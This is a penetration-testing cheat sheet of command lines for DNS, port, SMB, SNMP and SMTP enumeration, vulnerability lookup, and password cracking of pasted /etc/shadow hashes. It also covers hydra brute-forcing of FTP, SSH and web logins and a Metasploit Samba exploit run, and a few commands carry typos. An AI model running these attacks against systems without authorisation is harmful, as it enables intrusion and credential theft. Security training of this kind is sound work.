*Network penetration testing*

DNS enumeration
    Find name servers
        *$ host -t ns guif.re*
    Find email servers
        *$ host -t mx guif.re*
    Subdomain bruteforcing
        *$ for ip in $(cat list.txt); do host $ip.guif.re; done*
    Reverse dns lookup bruteforcing
        *$ for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"*
    Zone transfer request
        *$ host -l guif.re ns1.guif.re*
        *$ dnsrecon -d guif.re -t axfr*
    Finds nameservers for a given domain
        *$ host -t ns guif.re | cut -d " " -f 4 #*
        *$ dnsenum guif.re*
    Nmap zone transfer scan
        *$ nmap guif.re --script=dns-zone-transfer -p 53*
    Finds the domain names for a host.
        *$ whois guif.re*
    Find the IP and authoritative servers.
        *$ nslookup guif.re*
    Finds missconfigure DNS entries.
        *$ host -t ns guif.re*
    TheHarvester finds subdomains in google, bing, etc
        *$ python theHarvester.py  -l 500 -b all -d guif.re*

Port scanning
    Scan all 65536 ports TCP/UDP
    Find hosts alive
        *nmap -sP 192.168.0.0/24*
    Quick Nmap port enumeration
        *$ sudo nmap -vv -T5 -sS target*
    General nmap enumeration
        *$ sudo nmap -vv -Pn -A -sC -sS -T 4 -p- target*
    Identify hosts alive using ICMP ping
        *$ nmap -sn 192.168.0.1-250*
    3way handshake scan
        *$ nmap -nvv -w 1 IP 22-8*
    UDP scan
        *$ nmap -nvv -sU -z -w 1 IP 22-81*
    UDP scanning consists on sending an empty UDP packet. Open: reply back. Closed: ICMP unreachable packet is received
    ARP Scan
        *$ arp-scan 10.10.10.1/28 -I eth0*
    Nmap ping scan
        *$ sudo nmap –sn -oA nmap_pingscan 10.10.10.1/24*
    Nmap SYN/Top 100 ports Scan
        *$ nmap -sS -F -oA nmap_fastscan 10.10.10.1/24*
	Services versions scan
	    *$ nmap -sV 10.10.10.10*
	Run the default scripts and normal port scan against all the found ports
	    *$ nmap -sC 10.10.10.10*

Service enumeration
    Fingerprints OS using TCP window size
        *$ nmap -O target*
    Fingerprints services using banner grabbing
        *$ nmap -A target*
    Fingerprints services using banner grabbing
        *$ nmap -sV target*

SMB enumeration
    Versions 1,2,3. TCP 139, 445 and many UDP ports.
    Netbios scan
        *$ nbtscan -r 10.1.1.1/24*
    A null SMB session can be used to gather passwords and useful information from SMB 1.
    Null session and extract information.
        *$ nbtscan -r 10.1.1.1/24*
    Check for known SMB protocol vulnerabilities
        *$ nmap -v -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 10.1.1.1*
    Nmap SMB enumeration
        *$ nmap -script=smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse 10.0.0.1*

Directory bruteforcing
    *$ dirb http://guif.re /usr/share/wordlists/dirb/common.txt*

Web enumeration
    *$ nikto -host http://guif.re*

Mysql enumeration
    *$ nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 guif.re -p 3306*

SMTP enumeration
    Command to check if a user exists
        *>VRFY root*
    Command to ask the server if a user belongs to a mailing list
        *>EXPN root*
    Nmap scan
        *$ nmap -script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 guif.re*

SNMP enumeration
    *$ snmpwalk -c public -v1 guif.re*

FTP enumeration
    Nmap scan
        *$ nmap -script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 guif.re*
    Bruteforce
        *$ hydra -l user -P /usr/share/john/password.lst ftp://guif.re:21*

SSL connection
    *$ openssl s_client -connect guif.re:443*

Basic SSL ciphers check
    Nmap scan
        *$ nmap --script ssl-enum-ciphers -p 443 guif.re*
    Look for unsafe ciphers such as Triple-DES and Blowfish
    Very complete tool for SSL auditing is testssl.sh, finds BEAST, FREAK, POODLE, heart bleed, etc...

NSE enumeration
    SMB discovery
        *$ nmap IP --script smb-os-discovery.nse*
    SMB version
        *msfconsole; use scanner/smb/smb_version; set RHOSTS guif.re; run*
    MultiExploit
        *msfconsole; use exploit/multi/samba/usermap_script; set lhost 192.168.0.X; set rhost guif.re; run*

Simple  Network  Management  Protocol (SNMP) enumeration
    Based on UDP, stateless and susceptible to UDP spoofing
    *$ nmap -sU --open -p 16110.1.1.1-254 -oG out.txt*
    *$ snmpwalk -c public -v1  10.1.1.1 # we need to know that there is a community called public*
    *$ snmpwalk –c public –v1 192.168.11.204 1.3.6.1.4.1.77.1.2.25 # enumerate windows users*
    *$ snmpwalk 5c public 5v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2 # enumerates running processes*

Email addresses enumeration
    Find emails in google, bing, pgp etc
        *$ theharvester -d guif.re -b google*
    Fontact information for the domains they host
        *$ whois guif.re*
    Recon-ng scan
    *$ recon-ng; use module; set DOMAIN guif.re; run;
    Finds emails and employee name
        *recon/contacts/gather/http/api/whois_pocs*
    Finds xss published ad xssed.co
        *recon/hosts/enum/http/web/xssed*
    Finds subdomain
        *recon/hosts/gather/http/web/google_site*
    Finds IPs close to the domain and possible new domains
        *recon/hosts/gather/http/web/ip_neighbor*

Google search
    site:xxx -site:www.xxx
    filetype: look for specific documents, pdf, docx, etc..
    inurl
    intitle
    Others https://www.exploit-db.com/google-hacking-database/



Vulnerability scanning
    Search services vulnerabilities
    *$ searchsploit apache 2.2.3*
    *$ msfconsole; > search apache 2.2.3*

    nmap has many vulnerability scanning NSE scripts in /usr/share/nmap/scripts/
    OpenVAS
        Powerful vulnerability scanner with thousands of scan checks. Setup:
    *$ openvas-setup; openvas-adduser; gsd*


SMTP, testing for open relay
    SMTP relay, EXPN/VRFY command enabled
    *telnet <target IP> 25
    EHLO root
    MAIL FROM:root@target.com
    RCPT TO:example@gmail.com
    DATA
    Subject: Testing open mail relay.
    Testing SMTP open mail relay. Have a nice day.
    .
    QUIT*


Password cracking
    Find the type of hash:
    *$ hash-identifier*
    Find hash type https://hashkiller.co.uk
    Paste the entire /etc/shadow in file and run
        *$ john hashes.txt*
    Paste the entire /etc/shadow in file and run
        *$ john hashes.txt*
    GPU cracking:
        *$ hashcat -m 500 -a 0 -o output.txt -remove hashes.txt /usr/share/wordlists/rockyou.txt*
    CPU cracking:
        *$ john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump*

Bruteforce authentication
    *$ hydra 10.0.0.1 http-post-form “/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid” -P /usr/share/wordlists/rockyou.txt -l admin*

FTP bruteforce
    *$ msfconsole -q msf> search type:auxiliary login msf> use auxiliary/scanner/ftp/ftp_login*

SSH bruteforce
    *$ hydra -l root -P password-file.txt 10.10.10.10 ssh *

Tunneling your traffic through another host
    *$ sshuttle -r root@10.0.0.1 10.10.10.0/24*


Transfering files
    First step after gaining access to a remote machine is to upload new tools.
    Linux tools: netcat, curl, wget
    Windows: ftp, tftp, power shell script to echo and write.

Others
    Privilege escalation Linux https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation
    Privilege escalation Windows https://github.com/pentestmonkey/windows-privesc-check
    Common Meterpreter Payloads: http://netsec.ws/?p=331